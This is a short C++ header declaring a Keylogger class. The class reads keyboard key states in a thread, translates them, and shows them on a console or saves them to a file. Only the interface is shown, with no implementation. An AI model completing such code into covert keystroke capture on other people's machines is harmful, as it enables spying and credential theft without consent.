#pragma once
#include <fstream>
#include <iostream>
#include <thread>
#include "console.h"
#include "keyboard.h"

class Keylogger : public Keyboard {
private:
	std::wofstream file;
	std::thread* keylog;
	Console console;
	
	void setKeysState();
	void translateKeysStates();

	template<typename T >void handleTranslated(const T output);
	template<typename T> void showTranslated(const T output);
	template<typename T> void saveTranslated(const T output);
public:
	Keylogger();

	void startKeylog();
	void stopKeylog();
	bool isKeylogging();
};